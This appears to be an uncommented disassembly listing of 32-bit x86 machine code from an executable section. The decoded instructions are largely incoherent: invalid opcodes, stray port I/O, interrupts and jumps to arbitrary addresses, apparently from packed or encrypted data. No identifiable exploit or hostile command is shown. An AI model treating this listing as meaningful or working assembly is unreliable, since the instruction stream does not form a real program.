  40a4f0:	mov    cl,BYTE PTR [ebx+0x6c]
  40a4f3:	jno    0x40a51f
  40a4f5:	into   
  40a4f6:	ins    BYTE PTR es:[edi],dx
  40a4f7:	or     ch,BYTE PTR [ebx+0x2a]
  40a4fa:	ds mov bh,0x67
  40a4fd:	pop    es
  40a4fe:	stc    
  40a4ff:	jae    0x40a523
  40a501:	push   esi
  40a502:	les    edi,FWORD PTR [ebp+0x48abc323]
  40a508:	mov    ah,0x80
  40a50a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a50b:	outs   dx,DWORD PTR ds:[esi]
  40a50c:	xchg   ebp,eax
  40a50d:	mov    ds:0x185a719d,al
  40a512:	mov    ds:0x2dcfb49c,eax
  40a517:	in     al,dx
  40a518:	cmp    al,BYTE PTR [edi]
  40a51a:	add    DWORD PTR [edx],0x50153e72
  40a520:	ds test eax,0x29a130ad
  40a526:	fbstp  TBYTE PTR [ebp-0x53]
  40a529:	daa    
  40a52a:	scas   al,BYTE PTR es:[edi]
  40a52b:	jnp    0x40a4b6
  40a52d:	mov    dl,0x50
  40a52f:	mov    esi,0xb3e30c26
  40a534:	add    BYTE PTR [eax-0x7c243cde],cl
  40a53a:	imul   edx,DWORD PTR [ebx-0x1cba5fbd],0x70bbc5d6
  40a544:	lock les esi,FWORD PTR [ebp+0x1b3cfbd7]
  40a54b:	mov    ebp,0xc4158469
  40a550:	jns    0x40a50e
  40a552:	xchg   DWORD PTR [bp-0x70],eax
  40a556:	les    eax,FWORD PTR [eax]
  40a558:	fucomi st,st(7)
  40a55a:	stos   BYTE PTR es:[edi],al
  40a55b:	inc    eax
  40a55c:	adc    DWORD PTR [eax+0x35],ebp
  40a55f:	xor    eax,0xcf46a02f
  40a564:	sti    
  40a565:	xor    BYTE PTR [edi-0x5ae21331],bh
  40a56b:	mov    dh,0x43
  40a56d:	sar    DWORD PTR [eax-0x699c7fe6],0xeb
  40a574:	jne    0x40a589
  40a576:	imul   ebx,DWORD PTR ds:0xd80560c,0xffffffd3
  40a57d:	dec    esp
  40a57e:	(bad)  
  40a57f:	js     0x40a5af
  40a581:	or     bh,BYTE PTR [edx+0x6a376552]
  40a587:	adc    bh,BYTE PTR [edx]
  40a589:	add    ecx,ecx
  40a58b:	fild   QWORD PTR [ebp+0x3d]
  40a58e:	test   DWORD PTR [edx-0x57],ebx
  40a591:	cmp    esi,DWORD PTR [edi+0x70]
  40a594:	jmp    0x44541950
  40a599:	arpl   WORD PTR [esi+0x1],bx
  40a59c:	pop    edi
  40a59d:	push   eax
  40a59e:	bound  edx,QWORD PTR [esi-0xe]
  40a5a1:	or     BYTE PTR [eax],ah
  40a5a3:	mov    edi,0xe1b6c17e
  40a5a8:	xchg   esp,ebp
  40a5aa:	push   ss
  40a5ab:	mov    esi,0x4c25bfde
  40a5b0:	cmovge ebx,esi
  40a5b3:	rcl    DWORD PTR [ebp-0x6367b24],0x29
  40a5ba:	mov    ebx,0x83368e67
  40a5bf:	pop    edi
  40a5c0:	stos   BYTE PTR es:[edi],al
  40a5c1:	lds    edx,FWORD PTR [eax]
  40a5c3:	(bad)  
  40a5c4:	loop   0x40a547
  40a5c6:	cmp    DWORD PTR [ebp+ebx*8-0x23],ebx
  40a5ca:	inc    esp
  40a5cb:	adc    ebx,DWORD PTR [ecx+0x24805f6c]
  40a5d1:	fnstenv [ebp+0x2644e62c]
  40a5d7:	lods   eax,DWORD PTR ds:[esi]
  40a5d8:	mov    eax,ds:0xb71e3119
  40a5dd:	mov    ds:0xca8cff6f,al
  40a5e2:	jo     0x40a63d
  40a5e4:	sub    al,0x29
  40a5e6:	pop    ecx
  40a5e7:	call   FWORD PTR [esi]
  40a5e9:	imul   eax,DWORD PTR [edx+ecx*1-0x30734546],0x3c82f7ed
  40a5f4:	mov    ebp,0x1b9c29f6
  40a5f9:	ret    
  40a5fa:	inc    esi
  40a5fb:	push   edi
  40a5fc:	js     0x40a61a
  40a5fe:	mov    esp,DWORD PTR ds:0x63897f74
  40a604:	push   ebp
  40a605:	push   0x3
  40a607:	dec    ebp
  40a608:	arpl   WORD PTR [edi+0x157e1c2e],dx
  40a60e:	mov    DWORD PTR [esi+0x64],ecx
  40a611:	sbb    edx,DWORD PTR [ebx+0x6b013c71]
  40a617:	je     0x961fae81
  40a61d:	sub    bl,BYTE PTR [esi-0x48279028]
  40a623:	retf   0x7839
  40a626:	in     eax,0x6e
  40a628:	cs mov bl,0x70
  40a62b:	pop    ds
  40a62c:	out    0x2c,al
  40a62e:	test   al,0xd
  40a630:	and    al,0xc
  40a632:	fsub   st,st(3)
  40a634:	mov    DWORD PTR [edx],esp
  40a636:	cmp    ebp,DWORD PTR [ecx-0x22]
  40a639:	pushf  
  40a63a:	shl    cl,0xf7
  40a63d:	mov    bh,0xf
  40a63f:	cmp    al,BYTE PTR [esi]
  40a641:	rol    BYTE PTR [ecx-0x259dd03f],1
  40a647:	inc    esi
  40a648:	addr16 adc ch,0x12
  40a64c:	and    BYTE PTR ds:0x4041e1f2,cl
  40a652:	push   0x9f5c0e88
  40a657:	mov    bh,0xce
  40a659:	pop    ebp
  40a65a:	stos   BYTE PTR es:[edi],al
  40a65b:	loope  0x40a6bb
  40a65d:	hlt    
  40a65e:	or     al,0x76
  40a660:	out    0x8f,eax
  40a662:	retf   0x5eb
  40a665:	or     esp,DWORD PTR [ebp-0xb0be7c5]
  40a66b:	repnz sbb DWORD PTR [eax],ecx
  40a66e:	repnz adc eax,esp
  40a671:	fs stos BYTE PTR es:[edi],al
  40a673:	cmc    
  40a674:	das    
  40a675:	data16 sbb al,0x24
  40a678:	or     edx,DWORD PTR [ebp+0x6cdd6c67]
  40a67e:	data16 loop 0x40a67a
  40a681:	sub    bh,BYTE PTR [ecx+0x456f16fb]
  40a687:	retf   0xedf6
  40a68a:	fs jo  0x40a6b9
  40a68d:	xor    BYTE PTR [edx+ebp*4-0x69],cl
  40a691:	mov    ah,0xf3
  40a693:	inc    edi
  40a694:	add    BYTE PTR [esi],bl
  40a696:	and    BYTE PTR [edx-0xb],ch
  40a699:	stos   BYTE PTR es:[edi],al
  40a69a:	aad    0x2f
  40a69c:	test   ebx,ecx
  40a69e:	aam    0x18
  40a6a0:	loop   0x40a6d3
  40a6a2:	sbb    esi,ecx
  40a6a4:	jae    0x40a6e0
  40a6a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6a7:	ret    0xf777
  40a6aa:	mov    ?,WORD PTR [ecx+0x1a]
  40a6ad:	addr16 or al,0x8a
  40a6b0:	xchg   ah,bh
  40a6b2:	mov    BYTE PTR [edx-0x2c],0x96
  40a6b6:	js     0x40a669
  40a6b8:	test   BYTE PTR [ebp-0xe4deeab],dl
  40a6be:	and    al,0x4e
  40a6c0:	xchg   ebp,eax
  40a6c1:	xchg   esp,eax
  40a6c2:	add    ebp,DWORD PTR [ebp-0x174d2e88]
  40a6c8:	into   
  40a6c9:	nop
  40a6ca:	add    DWORD PTR [ebp+0x4f87c4bc],0x6e
  40a6d1:	pop    ecx
  40a6d2:	imul   ecx
  40a6d4:	test   eax,0x1e034392
  40a6d9:	pop    edi
  40a6da:	xchg   DWORD PTR [ebx],eax
  40a6dc:	(bad)  
  40a6dd:	jmp    0x40a9fe
  40a6e2:	in     eax,0x96
  40a6e4:	not    BYTE PTR [ebp+esi*2+0x15776574]
  40a6eb:	sub    dh,BYTE PTR [eax+edi*4-0x7f]
  40a6ef:	scas   al,BYTE PTR es:[edi]
  40a6f0:	out    dx,eax
  40a6f1:	xchg   esp,eax
  40a6f2:	js     0x40a6dd
  40a6f4:	jle    0x40a774
  40a6f6:	jp     0x40a775
  40a6f8:	jle    0x40a778
  40a6fa:	out    0x24,al
  40a6fc:	push   esp
  40a6fd:	mov    DWORD PTR [ebp+ebp*1-0x77],esi
  40a701:	fnstsw WORD PTR [ebp-0x1a16e687]
  40a707:	and    eax,0x6076c236
  40a70c:	mov    ecx,0x470db3ff
  40a711:	dec    eax
  40a712:	push   ebx
  40a713:	push   esp
  40a714:	retf   
  40a715:	push   ecx
  40a716:	fwait
  40a717:	xor    edi,esi
  40a719:	sbb    BYTE PTR [ebp-0x6f066aa],ch
  40a71f:	shld   edi,ecx,0x32
  40a723:	push   0x424cbd1f
  40a728:	xor    al,0xe2
  40a72a:	loop   0x40a6fa
  40a72c:	imul   edi,DWORD PTR [ebx],0xac84410c
  40a732:	push   ebp
  40a733:	pop    ds
  40a734:	fs test al,0x83
  40a737:	inc    eax
  40a738:	xor    eax,0xbb4a3dc4
  40a73d:	out    0xf7,al
  40a73f:	jg     0x40a7c0
  40a741:	mov    esp,0xa19c0976
  40a746:	dec    edi
  40a747:	adc    esi,DWORD PTR [ebp-0x33f44189]
  40a74d:	cwde   
  40a74e:	cs adc al,0xb6
  40a751:	int    0x1f
  40a753:	cmp    al,0xfb
  40a755:	pop    ebp
  40a756:	inc    ebx
  40a757:	lock mov edi,0x9d311440
  40a75d:	pushf  
  40a75e:	aad    0x3e
  40a760:	push   eax
  40a761:	in     eax,0x8c
  40a763:	rcr    DWORD PTR [edx+esi*8],0x18
  40a767:	add    bl,bl
  40a769:	dec    ebp
  40a76a:	imul   edi,DWORD PTR [ebx],0xe5c6e494
  40a770:	xchg   esp,eax
  40a771:	mov    ds,WORD PTR [ecx-0x61]
  40a774:	pushf  
  40a775:	pop    eax
  40a776:	out    dx,al
  40a777:	push   cs
  40a778:	and    cl,bh
  40a77a:	mov    dh,0x77
  40a77c:	or     al,0x26
  40a77e:	(bad)  
  40a77f:	(bad)  
  40a780:	push   ebx
  40a781:	leave  
  40a782:	into   
  40a783:	lds    esp,FWORD PTR [ebx+0x151dfe8]
  40a789:	push   ss
  40a78a:	es call 0x5b552d80
  40a790:	cmp    edi,0x60a23592
  40a796:	test   al,0x8b
  40a798:	mov    eax,0x7d493e8b
  40a79d:	xchg   DWORD PTR [ecx],eax
  40a79f:	cwde   
  40a7a0:	pop    eax
  40a7a1:	imul   ebx,DWORD PTR [ebx],0x2e
  40a7a4:	push   esp
  40a7a5:	mov    bh,0x99
  40a7a7:	(bad)  
  40a7a9:	jnp    0x40a824
  40a7ab:	jl     0x40a752
  40a7ad:	pop    ebp
  40a7ae:	push   ebp
  40a7af:	push   edi
  40a7b0:	repnz inc ecx
  40a7b2:	push   0xffffffae
  40a7b4:	jle    0x40a76b
  40a7b6:	adc    BYTE PTR [ebx+0x4a3c5561],0x72
  40a7bd:	pop    ebp
  40a7be:	mov    esi,0x15c4347d
  40a7c3:	imul   esp,DWORD PTR [ecx],0xb
  40a7c6:	inc    esi
  40a7c7:	xor    ebp,esp
  40a7c9:	dec    ecx
  40a7ca:	aaa    
  40a7cb:	and    ebx,DWORD PTR [edi+0x1]
  40a7ce:	jmp    0x40a829
  40a7d0:	inc    edi
  40a7d1:	cmp    al,0xfb
  40a7d3:	sub    BYTE PTR es:[edx],dh
  40a7d6:	or     al,0xf1
  40a7d8:	sbb    DWORD PTR [ecx],0x1ee02c62
  40a7de:	sar    BYTE PTR [edx+edx*4+0x7e],0xe7
  40a7e3:	inc    ebx
  40a7e4:	(bad)  
  40a7e5:	cdq    
  40a7e6:	pop    ecx
  40a7e7:	fs jb  0x40a854
  40a7ea:	call   0xd778067c
  40a7ef:	push   esi
  40a7f0:	cmp    DWORD PTR [ecx],esi
  40a7f2:	push   esi
  40a7f3:	mov    ah,0xd2
  40a7f5:	ret    
  40a7f6:	pushf  
  40a7f7:	jno    0x40a7dc
  40a7f9:	jmp    0x40a871
  40a7fb:	xor    eax,0xca6965f3
  40a800:	push   ds
  40a801:	jecxz  0x40a801
  40a803:	int    0xc9
  40a805:	xchg   ebp,eax
  40a806:	or     BYTE PTR [eax],bh
  40a808:	sub    ebx,eax
  40a80a:	hlt    
  40a80b:	pop    esp
  40a80c:	pop    esi
  40a80d:	push   0xd55d72c8
  40a812:	cmp    eax,0x9487fe46
  40a817:	push   ecx
  40a818:	repz xlat BYTE PTR ds:[ebx]
  40a81a:	or     eax,0xaddd49be
  40a81f:	loop   0x40a812
  40a821:	adc    eax,0x2f
  40a824:	leave  
  40a825:	jns    0x40a86c
  40a827:	std    
  40a828:	mov    edi,DWORD PTR [ebx]
  40a82a:	push   ds
  40a82b:	shl    dh,cl
  40a82d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a82e:	stc    
  40a82f:	call   0x338e:0x46431e92
  40a836:	mov    al,ds:0x16afda18
  40a83b:	dec    ebp
  40a83c:	test   eax,0x46e2f0a2
  40a841:	jae    0x40a897
  40a843:	xor    BYTE PTR [eax+edx*8+0xa],bl
  40a847:	inc    ebx
  40a848:	imul   BYTE PTR [edx-0x62]
  40a84b:	cli    
  40a84c:	je     0x40a7d8
  40a84e:	pop    esp
  40a84f:	pop    ds
  40a850:	mov    esp,0x920a062a
  40a855:	jbe    0x40a7e2
  40a857:	(bad)  
  40a858:	push   edi
  40a859:	lods   al,BYTE PTR ds:[esi]
  40a85a:	test   al,0x95
  40a85c:	jmp    0x7315bdd5
  40a861:	mov    ch,0x23
  40a863:	jecxz  0x40a8b4
  40a865:	push   ebp
  40a866:	std    
  40a867:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a868:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a869:	inc    edi
  40a86a:	cmp    bh,BYTE PTR [edi]
  40a86c:	loop   0x40a81d
  40a86e:	mov    ebx,0x18f97530
  40a873:	xor    DWORD PTR [eax+eax*8-0x67],edi
  40a877:	pusha  
  40a878:	and    ch,BYTE PTR [ecx+edi*1]
  40a87b:	test   eax,0xadaa27aa
  40a880:	xor    DWORD PTR [eax-0x7c],ecx
  40a883:	iret   
  40a884:	jp     0x40a8c6
  40a886:	push   0x6f
  40a888:	push   ss
  40a889:	loopne 0x40a859
  40a88b:	lds    edx,FWORD PTR [eax-0x9]
  40a88e:	add    BYTE PTR [esi+0x3b],0xb4
  40a892:	xchg   ecx,eax
  40a893:	and    dl,bl
  40a895:	pop    esi
  40a896:	push   0xbda04ba6
  40a89b:	and    eax,0x26a3bdcd
  40a8a0:	adc    esi,DWORD PTR [edx]
  40a8a2:	nop
  40a8a3:	test   al,0x6b
  40a8a5:	mov    ebp,0x5f904d2d
  40a8aa:	pop    eax
  40a8ab:	fsub   DWORD PTR [esi]
  40a8ad:	inc    ebp
  40a8ae:	pop    esi
  40a8af:	mov    ebx,0xc87477ff
  40a8b4:	scas   eax,DWORD PTR es:[edi]
  40a8b5:	add    ah,BYTE PTR ds:0x5979a208
  40a8bb:	xlat   BYTE PTR ds:[ebx]
  40a8bc:	mov    fs,WORD PTR [edx+ebx*1+0x4e88e0a9]
  40a8c3:	jnp    0x40a918
  40a8c5:	int    0x43
  40a8c7:	test   esp,0x9fe67dcf
  40a8cd:	das    
  40a8ce:	fld    QWORD PTR [ebx+ebx*1]
  40a8d1:	enter  0x15d0,0x56
  40a8d5:	fldz   
  40a8d7:	outs   dx,BYTE PTR ds:[esi]
  40a8d8:	push   ss
  40a8d9:	out    dx,al
  40a8da:	mov    ?,ebp
  40a8dc:	shl    BYTE PTR [edx-0x3ca485cd],0xd2
  40a8e3:	mov    ebp,0x21f34f79
  40a8e8:	sub    eax,0x7cd2b79
  40a8ed:	mov    al,0xb7
  40a8ef:	test   al,0x73
  40a8f1:	cmp    edi,DWORD PTR [esi-0x7c4736c]
  40a8f7:	xor    al,BYTE PTR [ecx]
  40a8f9:	mov    ah,0x7c
  40a8fb:	sbb    eax,DWORD PTR [ecx-0x4a]
  40a8fe:	pushf  
  40a8ff:	test   BYTE PTR [ebx+edi*4],cl
  40a902:	mov    bh,0x9d
  40a904:	sub    cl,dl
  40a906:	sbb    esp,DWORD PTR [edi]
  40a908:	mov    edi,0xf9bfc9cd
  40a90d:	sahf   
  40a90e:	shl    DWORD PTR [ebp+eax*4-0x60],0xd3
  40a913:	jnp    0x40a8e2
  40a915:	mov    cs:0x5d4f83d4,eax
  40a91b:	jecxz  0x40a8b8
  40a91d:	mov    esi,0xf71500ed
  40a922:	dec    esi
  40a923:	ins    BYTE PTR es:[edi],dx
  40a924:	pop    edx
  40a925:	aas    
  40a926:	ror    DWORD PTR [edx+edi*2],0x87
  40a92a:	dec    edx
  40a92b:	retf   0x5ad9
  40a92e:	push   edx
  40a92f:	add    BYTE PTR [ebx],ah
  40a931:	addr16 push edx
  40a933:	fld    st(1)
  40a935:	mov    DWORD PTR [edx-0x12b93000],edx
  40a93b:	or     edi,DWORD PTR [esi]
  40a93d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a93e:	and    ch,al
  40a940:	cmc    
  40a941:	fiadd  WORD PTR [ecx+0x30]
  40a944:	or     DWORD PTR [edx],esi
  40a946:	cdq    
  40a947:	mov    DWORD PTR [edx-0x67],esp
  40a94a:	bound  edi,QWORD PTR [edi]
  40a94c:	nop
  40a94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a94e:	sub    bh,dh
  40a950:	mov    dh,0x59
  40a952:	cwde   
  40a953:	je     0x40a8f6
  40a955:	push   esp
  40a956:	jge    0x40a9a9
  40a958:	inc    ebp
  40a959:	or     al,0xb9
  40a95b:	push   ebp
  40a95c:	cld    
  40a95d:	cmp    eax,0x7355cd83
  40a962:	pop    esp
  40a963:	(bad)  
  40a964:	fisttp QWORD PTR [edi-0x48dd2d5f]
  40a96a:	pushf  
  40a96b:	xchg   edi,eax
  40a96c:	sub    al,0x59
  40a96e:	mov    ebp,0x21ce2a55
  40a973:	xchg   edi,eax
  40a974:	xor    eax,0x36add92e
  40a979:	es dec ecx
  40a97b:	nop
  40a97c:	(bad)  
  40a97e:	clc    
  40a97f:	lock and ebx,DWORD PTR cs:[edi-0x16391873]
  40a987:	fcomip st,st(6)
  40a989:	fst    QWORD PTR [edi-0x23f599f3]
  40a98f:	arpl   WORD PTR [ecx-0x1d],dx
  40a992:	into   
  40a993:	push   edi
  40a994:	rcr    DWORD PTR [edx+0x38e7bac4],1
  40a99a:	ins    DWORD PTR es:[edi],dx
  40a99b:	ret    
  40a99c:	xchg   BYTE PTR [esp+eax*1-0x50fda24f],bl
  40a9a3:	fiadd  DWORD PTR [edi-0x34]
  40a9a6:	(bad)  
  40a9a7:	stos   DWORD PTR es:[edi],eax
  40a9a8:	inc    ebx
  40a9a9:	adc    bh,ch
  40a9ab:	cld    
  40a9ac:	call   0x8eea:0x2a39883
  40a9b3:	mov    ah,0xd9
  40a9b5:	adc    DWORD PTR [ecx+0x33],ebp
  40a9b8:	dec    ebx
  40a9b9:	outs   dx,DWORD PTR ds:[esi]
  40a9ba:	mov    esi,0x34315b59
  40a9bf:	inc    esi
  40a9c0:	iret   
  40a9c1:	outs   dx,BYTE PTR ds:[esi]
  40a9c2:	mov    ecx,0x706833a0
  40a9c7:	jge    0x40a9b4
  40a9c9:	xchg   esi,eax
  40a9ca:	fidiv  DWORD PTR [eax-0x367551bd]
  40a9d0:	mov    eax,0x1895e8ab
  40a9d5:	leave  
  40a9d6:	push   eax
  40a9d7:	jnp    0x40aa16
  40a9d9:	pop    edx
  40a9da:	inc    BYTE PTR [esi-0x5812e6c2]
  40a9e0:	in     eax,dx
  40a9e1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9e2:	repnz das 
  40a9e4:	in     al,dx
  40a9e5:	shr    BYTE PTR [edi],1
  40a9e7:	mov    ah,bh
  40a9e9:	(bad)  ds:0x196ddb37
  40a9ef:	sbb    al,0x8
  40a9f1:	(bad)
  40a9f5:	pop    ds
  40a9f6:	out    0x3b,al
  40a9f8:	xlat   BYTE PTR ds:[ebx]
  40a9f9:	pop    ss
  40a9fa:	push   edx
  40a9fb:	repz fisubr DWORD PTR [ebp+0x39]
  40a9ff:	add    DWORD PTR [edi],ecx
  40aa01:	test   BYTE PTR [edx],ah
  40aa03:	adc    BYTE PTR [eax],al
  40aa05:	add    BYTE PTR [ebx+0x458bec4d],cl
  40aa0b:	clc    
  40aa0c:	mov    eax,DWORD PTR [eax]
  40aa0e:	mov    eax,DWORD PTR [eax+0x3c]
  40aa11:	lea    ecx,[ecx*8+0x78]
  40aa18:	jmp    0x40ad39
  40aa1d:	dec    ebx
  40aa1e:	mov    bl,BYTE PTR [edi+0x55]
  40aa21:	pop    edi
  40aa22:	jno    0x40aa95
  40aa24:	nop
  40aa25:	retf   0x4daf
  40aa28:	add    DWORD PTR [ecx+0x24],eax
  40aa2b:	adc    al,0x13
  40aa2d:	add    al,0xf4
  40aa2f:	jle    0x40aaaf
  40aa31:	jp     0x40aab0
  40aa33:	jle    0x40aab3
  40aa35:	pusha  
  40aa36:	(bad)  
  40aa37:	out    0x1d,eax
  40aa39:	adc    BYTE PTR [ecx+0x4afd7d71],cl
  40aa3f:	pop    ebp
  40aa40:	push   ebp
  40aa41:	xor    ecx,edx
  40aa43:	adc    eax,0x7d9f4cc2
  40aa48:	in     eax,dx
  40aa49:	mov    DWORD PTR [ecx+0x44cf1797],ebp
  40aa4f:	stos   BYTE PTR es:[edi],al
  40aa50:	jbe    0x40aab3
  40aa52:	test   al,ch
  40aa54:	daa    
  40aa55:	loope  0x40aad2
  40aa57:	lock xchg DWORD PTR [ecx+edi*4+0x23747c2b],esi
  40aa5f:	mov    bl,cl
  40aa61:	mov    al,ds:0xd2443695
  40aa66:	ficomp DWORD PTR [edx-0x2a16f960]
  40aa6c:	icebp  
  40aa6d:	ins    BYTE PTR es:[edi],dx
  40aa6e:	add    al,BYTE PTR [esi-0x4]
  40aa71:	mov    ebp,0x45618e19
  40aa76:	jg     0x40aac1
  40aa78:	mov    DWORD PTR [esi],0xdcf1940a
  40aa7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa7f:	pop    ebx
  40aa80:	or     eax,0x403c4850
  40aa85:	lea    ecx,[ebx-0x34f41152]
  40aa8b:	inc    ebx
  40aa8c:	loop   0x40aa3a
  40aa8e:	cmp    edx,esi
  40aa90:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  40aa92:	cmp    cl,BYTE PTR [edi+ebp*1]
  40aa95:	sbb    al,ah
  40aa97:	and    eax,0xd0f48ce8
  40aa9c:	sub    al,0x5a
  40aa9e:	fimul  DWORD PTR [ebp-0x2f]
  40aaa1:	pop    edi
  40aaa2:	push   ds
  40aaa3:	xchg   BYTE PTR [edx+0x2d22d950],ch
  40aaa9:	add    BYTE PTR [eax-0x12321423],0x8b
  40aab0:	push   eax
  40aab1:	out    0x17,al
  40aab3:	leave  
  40aab4:	pop    esp
  40aab5:	push   edx
  40aab6:	inc    eax
  40aab7:	fcmovb st,st(5)
  40aab9:	repz push 0xffffffd1
  40aabc:	loope  0x40ab12
  40aabe:	and    dh,BYTE PTR [ebx]
  40aac0:	in     eax,0x67
  40aac2:	sub    eax,0xcddb8ed3
  40aac7:	sub    BYTE PTR [esi],cl
  40aac9:	sub    ebp,ecx
  40aacb:	inc    edi
  40aacc:	mov    esp,DWORD PTR [edi+0x69d9e9cd]
  40aad2:	mov    al,ds:0x567702a5
  40aad7:	ins    BYTE PTR es:[edi],dx
  40aad8:	mov    ebp,0xb22e8dfb
  40aadd:	test   al,0x41
  40aadf:	mov    al,ds:0x12b4affd
  40aae4:	pop    eax
  40aae5:	fild   DWORD PTR [ecx]
  40aae7:	dec    ecx
  40aae8:	lods   al,BYTE PTR ds:[esi]
  40aae9:	xor    dl,BYTE PTR [eax+0xc9cea96]
  40aaef:	in     al,dx
  40aaf0:	out    dx,eax
  40aaf1:	cmp    edi,ebp
  40aaf3:	ret    
  40aaf4:	call   0x8b0f:0x1abdf3cc
  40aafb:	(bad)  
  40aafc:	into   
  40aafd:	mov    esi,0xaf22257c
  40ab02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab03:	cli    
  40ab04:	ins    DWORD PTR es:[edi],dx
  40ab05:	not    BYTE PTR [esp+ebx*2]
  40ab08:	pusha  
  40ab09:	jge    0x40ab2c
  40ab0b:	mov    al,ds:0xc488f1a6
  40ab10:	sbb    DWORD PTR [ebx+esi*1-0x65],0xffffffcd
  40ab15:	gs push 0xffffffcd
  40ab18:	and    BYTE PTR [ebp-0x69d5f756],0x6e
  40ab1f:	out    0x7b,eax
  40ab21:	xchg   esi,ebx
  40ab23:	rcl    BYTE PTR [esi],1
  40ab25:	cmp    esp,0x6b
  40ab28:	cmp    ch,BYTE PTR [edi+0x1c86e05e]
  40ab2e:	push   ebx
  40ab2f:	or     ecx,DWORD PTR [edi]
  40ab31:	dec    ebx
  40ab32:	repnz cs push ebx
  40ab35:	outs   dx,BYTE PTR ds:[esi]
  40ab36:	mov    bl,dh
  40ab38:	push   DWORD PTR [esi]
  40ab3a:	push   cs
  40ab3b:	pop    ecx
  40ab3c:	das    
  40ab3d:	int    0xf8
  40ab3f:	fmul   DWORD PTR [ebx+0x3949f4d5]
  40ab45:	aas    
  40ab46:	mov    gs:0x434ba775,eax
  40ab4c:	mov    bh,0xb0
  40ab4e:	inc    edi
  40ab4f:	sahf   
  40ab50:	adc    ah,BYTE PTR [edi+0x1d]
  40ab53:	(bad)  
  40ab55:	cmp    al,dl
  40ab57:	or     DWORD PTR ds:0x3c731c6,0x51
  40ab5e:	pop    ebp
  40ab5f:	mov    DWORD PTR [edx+0x1],esi
  40ab62:	mov    ecx,0xcb92b95a
  40ab67:	test   BYTE PTR [ebp+0x75],ch
  40ab6a:	cmp    BYTE PTR [edx],al
  40ab6c:	retf   0x488b
  40ab6f:	aad    0x88
  40ab71:	pop    eax
  40ab72:	icebp  
  40ab73:	push   ebx
  40ab74:	mov    ds:0x2fdfc5bc,eax
  40ab79:	or     eax,0x624eda
  40ab7e:	push   ebp
  40ab7f:	cld    
  40ab80:	jb     0x40ab5c
  40ab82:	push   ds
  40ab83:	adc    DWORD PTR [eax+ecx*2+0x12],esp
  40ab87:	and    al,0xe8
  40ab89:	cli    
  40ab8a:	jg     0x40ab76
  40ab8c:	fstp   DWORD PTR [edx]
  40ab8e:	lock mov eax,0xd82d75a7
  40ab94:	jb     0x3a127658
  40ab9a:	pop    esp
  40ab9b:	gs dec eax
  40ab9d:	jns    0x40abbc
  40ab9f:	pusha  
  40aba0:	jmp    0xc369:0x1ec1f3b4
  40aba7:	sbb    eax,0x220ebbaf
  40abac:	mov    esp,0xafb61c55
  40abb1:	add    eax,DWORD PTR ds:0xb0655a13
  40abb7:	jbe    0x40ab66
  40abb9:	ins    BYTE PTR es:[edi],dx
  40abba:	push   es
  40abbb:	push   esi
  40abbc:	(bad)  
  40abbd:	cli    
  40abbe:	hlt    
  40abbf:	imul   edi,ebp,0x64218728
  40abc5:	fpatan 
  40abc7:	call   0x4aac9b0b
  40abcc:	mov    dl,0xed
  40abce:	xor    eax,0x85edc0d4
  40abd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abd4:	sbb    DWORD PTR [edi+0xb],ebp
  40abd7:	inc    ecx
  40abd8:	push   esp
  40abd9:	xor    al,0xc5
  40abdb:	fsub   DWORD PTR [edx+eiz*4+0x57]
  40abdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abe0:	add    al,0x8c
  40abe2:	mov    al,0x2e
  40abe4:	imul   ecx,DWORD PTR [ebx],0x59790d98
  40abea:	mov    esi,0xb726c8ba
  40abef:	rcr    DWORD PTR [ebx+0xd68c301],1
  40abf5:	fs inc esp
  40abf7:	inc    esp
  40abf8:	(bad)  
  40abf9:	stc    
  40abfa:	shl    eax,cl
  40abfc:	test   BYTE PTR [ebp-0x57],al
  40abff:	repnz test BYTE PTR [eax-0x4411d773],dh
  40ac06:	in     eax,dx
  40ac07:	mov    esp,0x3f170b90
  40ac0c:	lds    edi,FWORD PTR [ecx+0x20]
  40ac0f:	pop    es
  40ac10:	aad    0x70
  40ac12:	inc    ebp
  40ac13:	shl    BYTE PTR [ecx+0x1d381742],1
  40ac19:	cmp    eax,0xee34fbb2
  40ac1e:	mov    ch,0x1f
  40ac20:	popf   
  40ac21:	test   DWORD PTR ds:0x28bb5863,edx
  40ac27:	mov    ah,0xf5
  40ac29:	cmp    al,BYTE PTR [edx]
  40ac2b:	in     eax,dx
  40ac2c:	adc    ebp,DWORD PTR [ebx+0x31]
  40ac2f:	call   0xe4b9:0x8bc61991
  40ac36:	add    BYTE PTR [ecx+0x6],cl
  40ac39:	dec    ebx
  40ac3a:	push   esp
  40ac3b:	pop    edi
  40ac3c:	mov    eax,0xfb8c7e5d
  40ac41:	sbb    ebp,ebx
  40ac43:	in     eax,0xe0
  40ac45:	mov    ds:0xe1ce13fc,al
  40ac4a:	daa    
  40ac4b:	lods   al,BYTE PTR ds:[esi]
  40ac4c:	sub    eax,0x1ec217d8
  40ac51:	and    eax,0x446b7d77
  40ac56:	or     esp,DWORD PTR [ebp+0x2c]
  40ac59:	mov    esp,0xf3b619e8
  40ac5e:	imul   edi,esp,0x2b
  40ac61:	add    DWORD PTR [eax-0x25],0x6d
  40ac65:	ja     0x40ac7f
  40ac67:	cmp    esi,ebp
  40ac69:	rcl    BYTE PTR [eax+0x3d],0xc7
  40ac6d:	adc    eax,0xf2059361
  40ac72:	pop    esp
  40ac73:	mov    esi,DWORD PTR [edx+0xb]
  40ac76:	jns    0x40ac13
  40ac78:	jno    0x40acba
  40ac7a:	ss aam 0xeb
  40ac7d:	cwde   
  40ac7e:	idiv   BYTE PTR [ecx-0x41]
  40ac81:	mov    ah,0x29
  40ac83:	mov    DWORD PTR [esi-0xde28693],edx
  40ac89:	not    DWORD PTR [ebp-0x4125e3a6]
  40ac8f:	jecxz  0x40accc
  40ac91:	mov    ebx,0x1e131b61
  40ac96:	jecxz  0x40aca9
  40ac98:	clc    
